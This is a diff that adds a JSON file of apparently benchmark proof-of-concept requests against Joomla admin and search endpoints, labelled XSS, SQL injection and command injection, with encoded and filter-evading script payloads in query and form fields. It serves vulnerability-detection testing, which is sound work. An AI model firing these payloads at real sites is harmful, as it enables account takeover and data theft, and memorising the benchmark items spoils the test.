@@ -1,0 +1,950 @@
+[
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "GET",
+    "path": "/administrator/index.php",
+    "post_data": {},
+    "query_params": {
+      "layout": [
+        "langforum"
+      ],
+      "option": [
+        "com_admin"
+      ],
+      "view": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.693f0d93a74ca",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_0cd60a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "GET",
+    "path": "/administrator/index.php",
+    "post_data": {},
+    "query_params": {
+      "format": [
+        "raw"
+      ],
+      "group": [
+        "system"
+      ],
+      "option": [
+        "com_ajax"
+      ],
+      "plugin": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.693f0d880bcb0",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_242318",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "WHERE `m`.`user_id` ": [
+        "237"
+      ]
+    },
+    "query_params": {
+      "option": [
+        "sqli%2527"
+      ]
+    },
+    "request_id": "requests.693f0dab4f8f1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_2885e5",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "67193131864d5c4164b2fbebee573080": [
+        "1"
+      ],
+      "batch_urls": [
+        "ftmwtiku"
+      ],
+      "boxchecked": [
+        "0"
+      ],
+      "filter[http_status]": [
+        "</title></option><script>xss(62714740)</script>"
+      ],
+      "filter[search]": [
+        "ftmwtiku"
+      ],
+      "filter[state]": [
+        "</title></option><script>xss(85156938)</script>"
+      ],
+      "list[fullordering]": [
+        "a.old_url ASC"
+      ],
+      "list[limit]": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "task": [
+        ""
+      ]
+    },
+    "query_params": {
+      "option": [
+        "com_redirect"
+      ],
+      "view": [
+        "links"
+      ]
+    },
+    "request_id": "requests.693f0d8404475",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_31ad61",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/index.php/using-joomla/extensions/components/search-component/search",
+    "post_data": {
+      "Search": [
+        ""
+      ],
+      "ordering": [
+        "newest"
+      ],
+      "searchphrase": [
+        "all"
+      ],
+      "searchword": [
+        "x\" onerror=\"xss(76294298)\""
+      ],
+      "task": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693f0d861da3b",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_390462",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "GET",
+    "path": "/administrator/index.php",
+    "post_data": {},
+    "query_params": {
+      "format": [
+        "raw"
+      ],
+      "group": [
+        "system"
+      ],
+      "option": [
+        "com_ajax"
+      ],
+      "plugin": [
+        "\"><svg onload=alert(987890)//"
+      ]
+    },
+    "request_id": "requests.693f0d880bcb0",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_3f80bf",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "67193131864d5c4164b2fbebee573080": [
+        "1"
+      ],
+      "batch_urls": [
+        "ftmwtiku"
+      ],
+      "boxchecked": [
+        "0"
+      ],
+      "filter[http_status]": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ],
+      "filter[search]": [
+        "ftmwtiku"
+      ],
+      "filter[state]": [
+        "</title></option><script>xss(85156938)</script>"
+      ],
+      "list[fullordering]": [
+        "a.old_url ASC"
+      ],
+      "list[limit]": [
+        "</title></option><script>xss(41026807)</script>"
+      ],
+      "task": [
+        ""
+      ]
+    },
+    "query_params": {
+      "option": [
+        "com_redirect"
+      ],
+      "view": [
+        "links"
+      ]
+    },
+    "request_id": "requests.693f0d847aced",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_43f98c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "2762fee82b41abbc86754eaa46bfd6d6": [
+        "1"
+      ],
+      "boxchecked": [
+        "0"
+      ],
+      "filter[search]": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "list[fullordering]": [
+        ""
+      ],
+      "list[limit]": [
+        "5"
+      ],
+      "task": [
+        ""
+      ]
+    },
+    "query_params": {
+      "option": [
+        "com_checkin"
+      ]
+    },
+    "request_id": "requests.693f0d7ccb6e4",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_4b928b",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "67193131864d5c4164b2fbebee573080": [
+        "1"
+      ],
+      "batch_urls": [
+        "ftmwtiku"
+      ],
+      "boxchecked": [
+        "0"
+      ],
+      "filter[http_status]": [
+        "</title></option><script>xss(62714740)</script>"
+      ],
+      "filter[search]": [
+        "ftmwtiku"
+      ],
+      "filter[state]": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "list[fullordering]": [
+        "a.old_url ASC"
+      ],
+      "list[limit]": [
+        "</title></option><script>xss(41026807)</script>"
+      ],
+      "task": [
+        ""
+      ]
+    },
+    "query_params": {
+      "option": [
+        "com_redirect"
+      ],
+      "view": [
+        "links"
+      ]
+    },
+    "request_id": "requests.693f0d83cccb2",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_5a732c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/index.php/using-joomla/extensions/components/search-component/search",
+    "post_data": {
+      "Search": [
+        ""
+      ],
+      "ordering": [
+        "newest"
+      ],
+      "searchphrase": [
+        "all"
+      ],
+      "searchword": [
+        "x\" onerror=\"xss(76294298)\""
+      ],
+      "task": [
+        "`"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693f0d861da3b",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_64f1dd",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "GET",
+    "path": "/index.php/image-gallery/animals/33-phyllopteryx",
+    "post_data": {},
+    "query_params": {
+      "layout": [
+        "default"
+      ],
+      "print": [
+        "1"
+      ],
+      "tmpl": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ]
+    },
+    "request_id": "requests.693f0d7d90e6b",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_667f40",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "67193131864d5c4164b2fbebee573080": [
+        "1"
+      ],
+      "batch_urls": [
+        "ftmwtiku"
+      ],
+      "boxchecked": [
+        "0"
+      ],
+      "filter[http_status]": [
+        "</title></option><script>xss(62714740)</script>"
+      ],
+      "filter[search]": [
+        "ftmwtiku"
+      ],
+      "filter[state]": [
+        "</title></option><script>xss(85156938)</script>"
+      ],
+      "list[fullordering]": [
+        "a.old_url ASC"
+      ],
+      "list[limit]": [
+        "</title></option><script>xss(41026807)</script>"
+      ],
+      "task": [
+        ""
+      ]
+    },
+    "query_params": {
+      "option": [
+        "com_redirect"
+      ],
+      "view": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.693f0d8366b73",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_6e9450",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "WHERE `m`.`user_id` ": [
+        "237"
+      ]
+    },
+    "query_params": {
+      "option": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.693f0dab4f8f1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_810c2e",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "WHERE `m`.`user_id` ": [
+        "237"
+      ]
+    },
+    "query_params": {
+      "option": [
+        "\""
+      ]
+    },
+    "request_id": "requests.693f0dab4f8f1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_94bc54",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "67193131864d5c4164b2fbebee573080": [
+        "1"
+      ],
+      "batch_urls": [
+        "ftmwtiku"
+      ],
+      "boxchecked": [
+        "0"
+      ],
+      "filter[http_status]": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ],
+      "filter[search]": [
+        "ftmwtiku"
+      ],
+      "filter[state]": [
+        "</title></option><script>xss(85156938)</script>"
+      ],
+      "list[fullordering]": [
+        "a.old_url ASC"
+      ],
+      "list[limit]": [
+        "</title></option><script>xss(41026807)</script>"
+      ],
+      "task": [
+        ""
+      ]
+    },
+    "query_params": {
+      "option": [
+        "com_redirect"
+      ],
+      "view": [
+        "links"
+      ]
+    },
+    "request_id": "requests.693f0d847aced",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_955367",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "GET",
+    "path": "/administrator/index.php",
+    "post_data": {},
+    "query_params": {
+      "format": [
+        "raw"
+      ],
+      "group": [
+        "\""
+      ],
+      "option": [
+        "com_ajax"
+      ],
+      "plugin": [
+        "sendStats"
+      ]
+    },
+    "request_id": "requests.693f0d880573c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_a580ea",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "67193131864d5c4164b2fbebee573080": [
+        "1"
+      ],
+      "batch_urls": [
+        "ftmwtiku"
+      ],
+      "boxchecked": [
+        "0"
+      ],
+      "filter[http_status]": [
+        "</title></option><script>xss(62714740)</script>"
+      ],
+      "filter[search]": [
+        "ftmwtiku"
+      ],
+      "filter[state]": [
+        "</title></option><script>xss(85156938)</script>"
+      ],
+      "list[fullordering]": [
+        "a.old_url ASC"
+      ],
+      "list[limit]": [
+        "</title></option><script>xss(41026807)</script>"
+      ],
+      "task": [
+        ""
+      ]
+    },
+    "query_params": {
+      "option": [
+        "com_redirect"
+      ],
+      "view": [
+        "\""
+      ]
+    },
+    "request_id": "requests.693f0d8366b73",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_aca707",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "67193131864d5c4164b2fbebee573080": [
+        "1"
+      ],
+      "batch_urls": [
+        "ftmwtiku"
+      ],
+      "boxchecked": [
+        "0"
+      ],
+      "filter[http_status]": [
+        "</title></option><script>xss(62714740)</script>"
+      ],
+      "filter[search]": [
+        "ftmwtiku"
+      ],
+      "filter[state]": [
+        "</title></option><script>xss(85156938)</script>"
+      ],
+      "list[fullordering]": [
+        "a.old_url ASC"
+      ],
+      "list[limit]": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ],
+      "task": [
+        ""
+      ]
+    },
+    "query_params": {
+      "option": [
+        "com_redirect"
+      ],
+      "view": [
+        "links"
+      ]
+    },
+    "request_id": "requests.693f0d8404475",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_b5957c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "WHERE `m`.`user_id` ": [
+        "237"
+      ]
+    },
+    "query_params": {
+      "2762fee82b41abbc86754eaa46bfd6d6": [
+        "1"
+      ],
+      "option": [
+        "com_login"
+      ],
+      "task": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "uid": [
+        "237"
+      ]
+    },
+    "request_id": "requests.693f0da283199",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_c2c5f0",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "67193131864d5c4164b2fbebee573080": [
+        "1"
+      ],
+      "batch_urls": [
+        "ftmwtiku"
+      ],
+      "boxchecked": [
+        "0"
+      ],
+      "filter[http_status]": [
+        "</title></option><script>xss(62714740)</script>"
+      ],
+      "filter[search]": [
+        "ftmwtiku"
+      ],
+      "filter[state]": [
+        "</title></option><script>xss(85156938)</script>"
+      ],
+      "list[fullordering]": [
+        "a.old_url ASC"
+      ],
+      "list[limit]": [
+        "</title></option><script>xss(41026807)</script>"
+      ],
+      "task": [
+        "\""
+      ]
+    },
+    "query_params": {
+      "option": [
+        "com_redirect"
+      ],
+      "view": [
+        "links"
+      ]
+    },
+    "request_id": "requests.693f0d83e004f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_c38811",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "WHERE `m`.`user_id` ": [
+        "237"
+      ]
+    },
+    "query_params": {
+      "option": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.693f0dab4f8f1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_c47ad3",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "WHERE `m`.`user_id` ": [
+        "237"
+      ]
+    },
+    "query_params": {
+      "option": [
+        "sqli'@test.com"
+      ]
+    },
+    "request_id": "requests.693f0dab4f8f1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_cfe1f3",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "WHERE `m`.`user_id` ": [
+        "237"
+      ]
+    },
+    "query_params": {
+      "option": [
+        "\""
+      ]
+    },
+    "request_id": "requests.693f0dab4f8f1",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_d03a62",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "2762fee82b41abbc86754eaa46bfd6d6": [
+        "1"
+      ],
+      "boxchecked": [
+        "0"
+      ],
+      "filter[search]": [
+        "`"
+      ],
+      "list[fullordering]": [
+        ""
+      ],
+      "list[limit]": [
+        "5"
+      ],
+      "task": [
+        ""
+      ]
+    },
+    "query_params": {
+      "option": [
+        "com_checkin"
+      ]
+    },
+    "request_id": "requests.693f0d7ccb6e4",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_d47fe7",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "GET",
+    "path": "/index.php/image-gallery/animals/33-phyllopteryx",
+    "post_data": {},
+    "query_params": {
+      "layout": [
+        "default"
+      ],
+      "print": [
+        "1"
+      ],
+      "tmpl": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.693f0d7d90e6b",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_ded2f6",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/administrator/index.php",
+    "post_data": {
+      "67193131864d5c4164b2fbebee573080": [
+        "1"
+      ],
+      "batch_urls": [
+        "ftmwtiku"
+      ],
+      "boxchecked": [
+        "0"
+      ],
+      "filter[http_status]": [
+        "</title></option><script>xss(62714740)</script>"
+      ],
+      "filter[search]": [
+        "ftmwtiku"
+      ],
+      "filter[state]": [
+        "</title></option><script>xss(85156938)</script>"
+      ],
+      "list[fullordering]": [
+        "a.old_url ASC"
+      ],
+      "list[limit]": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ],
+      "task": [
+        ""
+      ]
+    },
+    "query_params": {
+      "option": [
+        "com_redirect"
+      ],
+      "view": [
+        "links"
+      ]
+    },
+    "request_id": "requests.693f0d8404475",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_f87ccd",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "joomla",
+    "application_name": "Joomla",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-joomla-v0.1.0",
+    "method": "POST",
+    "path": "/index.php/using-joomla/extensions/components/search-component/search",
+    "post_data": {
+      "Search": [
+        ""
+      ],
+      "ordering": [
+        "newest"
+      ],
+      "searchphrase": [
+        "all"
+      ],
+      "searchword": [
+        "x\" onerror=\"xss(76294298)\""
+      ],
+      "task": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.693f0d861da3b",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/joomla/joomla-cms",
+    "vuln_id": "vuln_function_fc3cc3",
+    "vuln_type": "xss"
+  }
+]
